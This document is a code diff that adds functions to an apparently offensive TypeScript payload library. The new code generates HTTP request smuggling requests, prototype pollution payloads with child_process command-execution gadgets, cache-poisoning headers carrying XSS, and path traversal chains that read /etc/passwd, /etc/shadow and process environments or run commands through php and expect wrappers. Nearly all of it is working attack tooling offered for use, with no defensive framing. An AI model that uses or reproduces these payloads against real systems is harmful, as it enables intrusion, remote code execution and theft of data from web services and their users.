@@ -3155,3 +3155,271 @@ export function buildAllBypassPayloads(target: string): BypassPayload[] {
     ...buildNetworkBypass(target),
   ];
 }
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   HTTP REQUEST SMUGGLING — CL.TE, TE.CL, TE.TE, H2.CL, H2.TE
+   ═══════════════════════════════════════════════════════════════════════════ */
+export interface SmuggleResult {
+  technique:   string;
+  frontHeaders: Record<string, string>;
+  rawRequest:   string;
+  notes:        string;
+}
+
+export function buildHttpSmuggling(host: string, path: string, poisonPayload: string): SmuggleResult[] {
+  const results: SmuggleResult[] = [];
+
+  const innerGet =
+    `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nX-Smuggled: 1\r\n\r\n`;
+
+  const clTeBody = `0\r\n\r\n${poisonPayload}`;
+  results.push({
+    technique: "CL.TE (front: Content-Length wins, back: Transfer-Encoding wins)",
+    frontHeaders: {
+      "Content-Length": String(clTeBody.length),
+      "Transfer-Encoding": "chunked",
+    },
+    rawRequest:
+      `POST ${path} HTTP/1.1\r\nHost: ${host}\r\n` +
+      `Content-Type: application/x-www-form-urlencoded\r\n` +
+      `Content-Length: ${clTeBody.length}\r\n` +
+      `Transfer-Encoding: chunked\r\n\r\n` +
+      clTeBody,
+    notes:
+      "Front proxy uses CL, backend uses TE. Body suffix becomes prefix of next victim request.",
+  });
+
+  const innerLen  = Buffer.byteLength(innerGet);
+  const teClChunk = innerLen.toString(16).toUpperCase();
+  const teClBody  = `${teClChunk}\r\n${innerGet}\r\n0\r\n\r\n`;
+  results.push({
+    technique: "TE.CL (front: Transfer-Encoding wins, back: Content-Length wins)",
+    frontHeaders: {
+      "Transfer-Encoding": "chunked",
+      "Content-Length": String(teClBody.length - 5),
+    },
+    rawRequest:
+      `POST ${path} HTTP/1.1\r\nHost: ${host}\r\n` +
+      `Content-Type: application/x-www-form-urlencoded\r\n` +
+      `Transfer-Encoding: chunked\r\n` +
+      `Content-Length: ${teClBody.length - 5}\r\n\r\n` +
+      teClBody,
+    notes:
+      "Front proxy uses TE (reads full chunked body), backend uses CL (reads partial) — leftover is prepended to next request.",
+  });
+
+  const teTeVariants: Array<[string, string]> = [
+    ["Transfer-Encoding", "xchunked"],
+    ["Transfer-Encoding", "chunked, identity"],
+    ["Transfer-Encoding", "CHUNKED"],
+    ["X-Transfer-Encoding", "chunked"],
+    ["Transfer-Encoding ", "chunked"],
+    ["Transfer-Encoding:", "chunked"],
+  ];
+  for (const [hdr, val] of teTeVariants) {
+    results.push({
+      technique: `TE.TE obfuscation — header "${hdr}: ${val}"`,
+      frontHeaders: { "Transfer-Encoding": "chunked", [hdr]: val },
+      rawRequest:
+        `POST ${path} HTTP/1.1\r\nHost: ${host}\r\n` +
+        `Transfer-Encoding: chunked\r\n${hdr}: ${val}\r\n` +
+        `Content-Length: ${clTeBody.length}\r\n\r\n` + clTeBody,
+      notes:
+        "Both front and back support TE but one deobfuscates the variant differently — desync occurs at the ambiguity.",
+    });
+  }
+
+  results.push({
+    technique: "H2.CL — HTTP/2 to HTTP/1 downgrade with CL injection",
+    frontHeaders: { ":method": "POST", ":path": path, ":scheme": "https", ":authority": host, "content-length": "0" },
+    rawRequest:
+      `POST ${path} HTTP/2\r\nHost: ${host}\r\ncontent-length: 0\r\n\r\n` +
+      `GET /smuggled HTTP/1.1\r\nHost: ${host}\r\nContent-Length: 5\r\n\r\nsmggl`,
+    notes:
+      "HTTP/2 request downgraded to HTTP/1.1 by front-end; injected CL header creates smuggle prefix on backend connection.",
+  });
+
+  results.push({
+    technique: "H2.TE — HTTP/2 with Transfer-Encoding header smuggled through",
+    frontHeaders: { ":method": "POST", ":path": path, "transfer-encoding": "chunked" },
+    rawRequest:
+      `POST ${path} HTTP/2\r\nHost: ${host}\r\ntransfer-encoding: chunked\r\n\r\n` +
+      `0\r\n\r\nGET /poison HTTP/1.1\r\nHost: ${host}\r\nFoo: bar`,
+    notes:
+      "HTTP/2 prohibits TE header but some frontends forward it; backend treats it as chunked, desync follows.",
+  });
+
+  results.push({
+    technique: "CRLF injection in header value to smuggle second request",
+    frontHeaders: {
+      "X-Forwarded-For": `127.0.0.1\r\nTransfer-Encoding: chunked`,
+    },
+    rawRequest:
+      `GET ${path} HTTP/1.1\r\nHost: ${host}\r\n` +
+      `X-Forwarded-For: 127.0.0.1\r\nTransfer-Encoding: chunked\r\n\r\n` +
+      `0\r\n\r\n${poisonPayload}`,
+    notes:
+      "If front-end passes X-Forwarded-For value verbatim, embedded CRLF injects TE header into backend request.",
+  });
+
+  results.push({
+    technique: "Header-based request tunneling (SSRF via smuggle)",
+    frontHeaders: { "Host": `${host}\r\nHost: internal-admin.local` },
+    rawRequest:
+      `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nHost: internal-admin.local\r\n\r\n`,
+    notes:
+      "Duplicate Host headers; some frontends forward both. Backend may route based on second Host value allowing SSRF to internal services.",
+  });
+
+  return results;
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   PROTOTYPE POLLUTION — JSON body / query / URL / __proto__ / constructor
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildPrototypePollutionPayloads(gadget = "exec", cmd = "id"): string[] {
+  const payloads: string[] = [];
+
+  const jsonProto = (key: string, val: unknown) =>
+    JSON.stringify({ "__proto__": { [key]: val }, "constructor": { "prototype": { [key]: val } } });
+
+  payloads.push(jsonProto("isAdmin", true));
+  payloads.push(jsonProto("role", "admin"));
+  payloads.push(jsonProto("authenticated", true));
+  payloads.push(jsonProto("__proto__", { "isAdmin": true, "role": "admin" }));
+  payloads.push(jsonProto("toString", { "value": `function(){return '${cmd}';}` }));
+
+  if (gadget === "exec" || gadget === "rce") {
+    payloads.push(jsonProto("shell", "/bin/bash"));
+    payloads.push(jsonProto("env", { "NODE_OPTIONS": `--require /dev/stdin`, "NODE_EXTRA_CA_CERTS": `/dev/stdin` }));
+    payloads.push(JSON.stringify({ "__proto__": { "shell": "node", "input": `process.mainModule.require('child_process').exec('${cmd}')` } }));
+    payloads.push(JSON.stringify({ "__proto__": { "type": "Program", "body": [{ "type": "MustacheStatement", "path": { "type": "PathExpression", "original": "constructor" }, "params": [{ "type": "StringLiteral", "value": `return process.mainModule.require('child_process').exec('${cmd}')` }] }] } }));
+    payloads.push(JSON.stringify({
+      "__proto__": {
+        "outputFunctionName": `_tmp1;global.process.mainModule.require('child_process').execSync('${cmd}');var __tmp2`,
+      }
+    }));
+    payloads.push(JSON.stringify({
+      "__proto__": {
+        "escapeFunction": `1;return global.process.mainModule.require('child_process').execSync('${cmd}').toString()//`,
+      }
+    }));
+    payloads.push(JSON.stringify({ "__proto__": { "execPath": cmd, "NODE_OPTIONS": "--inspect=0.0.0.0:9229" } }));
+  }
+
+  const urlVariants = [
+    `?__proto__[isAdmin]=true&constructor[prototype][role]=admin`,
+    `?__proto__.isAdmin=true&constructor.prototype.role=admin`,
+    `?__proto__[shell]=/bin/bash&__proto__[env][NODE_OPTIONS]=--require+/dev/stdin`,
+    `?a[__proto__][isAdmin]=1&a[__proto__][role]=admin`,
+    `?__proto__[outputFunctionName]=_nx;require('child_process').exec('${cmd}');var _nx2`,
+  ];
+  payloads.push(...urlVariants);
+
+  const dotNotation = [
+    `constructor.prototype.isAdmin=true`,
+    `__proto__.isAdmin=true&__proto__.role=admin`,
+    `__proto__[isAdmin]=1&__proto__[role]=admin&__proto__[authenticated]=1`,
+  ];
+  payloads.push(...dotNotation);
+
+  return payloads;
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   CACHE POISONING — via Host, X-Forwarded-Host, X-Forwarded-Scheme, etc.
+   ═══════════════════════════════════════════════════════════════════════════ */
+export interface CachePoisonResult {
+  technique:    string;
+  headers:      Record<string, string>;
+  xssPayload?:  string;
+  notes:        string;
+}
+
+export function buildCachePoisoningPayloads(host: string, injectHost: string, xssPayload = `"><script>alert(document.domain)</script>`): CachePoisonResult[] {
+  return [
+    {
+      technique: "Host header injection → reflected in Location / canonical URL",
+      headers: { "Host": injectHost, "X-Forwarded-Host": injectHost },
+      xssPayload,
+      notes: "If app caches page with injected Host, all users receive poisoned response with attacker domain in links/redirects.",
+    },
+    {
+      technique: "X-Forwarded-Host → reflected in meta canonical / og:url",
+      headers: { "Host": host, "X-Forwarded-Host": `${injectHost}"><script>alert(1)</script>` },
+      xssPayload,
+      notes: "Unsanitised X-Forwarded-Host reflected in HTML meta tags; once cached, triggers stored XSS for all visitors.",
+    },
+    {
+      technique: "X-Forwarded-Scheme: http → HTTPS→HTTP downgrade in Location",
+      headers: { "Host": host, "X-Forwarded-Scheme": "http", "X-Forwarded-Host": injectHost },
+      notes: "Forces redirect to HTTP allowing MITM on cached redirect; also useful for bypassing HTTPS-only WAF rules.",
+    },
+    {
+      technique: "Unkeyed header: X-Original-URL path override",
+      headers: { "Host": host, "X-Original-URL": `/admin`, "X-Rewrite-URL": `/admin` },
+      notes: "Cache key uses visible URL, but app routes to X-Original-URL. Cache serves /admin response for / to all users.",
+    },
+    {
+      technique: "Cache-key confusion via port in Host",
+      headers: { "Host": `${host}:1337`, "X-Forwarded-Port": "1337" },
+      notes: "Cache key ignores port; app reflects it in absolute URLs. Poison the portless cache entry.",
+    },
+    {
+      technique: "Fat GET — body params reflected, cache key is GET URL only",
+      headers: { "Host": host, "Content-Type": "application/x-www-form-urlencoded", "Content-Length": xssPayload.length.toString() },
+      xssPayload,
+      notes: "Some frameworks merge GET+body params. Cache key = URL only, so poisoned body value gets cached.",
+    },
+    {
+      technique: "Vary: Origin bypass — null origin accepted and cached",
+      headers: { "Host": host, "Origin": "null" },
+      notes: "If server caches CORS response for Origin:null and returns Access-Control-Allow-Origin:null, attacker sandboxed iframe can send credentialed requests.",
+    },
+  ];
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   PATH TRAVERSAL + INJECTION CHAINS
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildPathTraversalChains(cmd: string): string[] {
+  const enc  = (s: string) => encodeURIComponent(s);
+  const denc = (s: string) => encodeURIComponent(encodeURIComponent(s));
+  const uni  = (s: string) => s.split("").map(c => c === "/" ? "%c0%af" : c).join("");
+  const back = "../".repeat(8);
+  const etcp = "/etc/passwd";
+
+  return [
+    `${back}etc/passwd`,
+    `${back}etc/shadow`,
+    `${back}proc/self/environ`,
+    `${back}proc/self/cmdline`,
+    `....//....//....//....//etc/passwd`,
+    `..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd`,
+    `..%252F..%252F..%252F..%252Fetc%252Fpasswd`,
+    denc(`../../../../etc/passwd`),
+    uni(`../../../../etc/passwd`),
+    `%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd`,
+    `....\\....\\....\\....\\etc\\passwd`,
+    `..\\..\\..\\..\\windows\\win.ini`,
+    `..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts`,
+    `${back}windows\\system32\\cmd.exe?/c+${enc(cmd)}`,
+    `${back}bin/sh?-c+${enc(cmd)}`,
+    `/var/log/nginx/access.log`,
+    `/var/log/apache2/access.log`,
+    `/proc/self/fd/1`,
+    `php://filter/convert.base64-encode/resource=/etc/passwd`,
+    `php://filter/read=string.rot13/resource=/etc/passwd`,
+    `php://input`,
+    `data://text/plain;base64,${Buffer.from(`<?php system('${cmd}'); ?>`).toString("base64")}`,
+    `expect://${cmd}`,
+    `zip://tmp/nx.zip%23nx.php`,
+    `phar://tmp/nx.phar/nx.php`,
+    `/etc/passwd%00.jpg`,
+    `/etc/passwd\x00.jpg`,
+    `${etcp}%00`,
+    `${etcp}%00.html`,
+    `${etcp}%0a`,
+    `${back}etc/passwd%0aContent-Type: text/html%0a%0a<script>alert(1)</script>`,
+  ];
+}
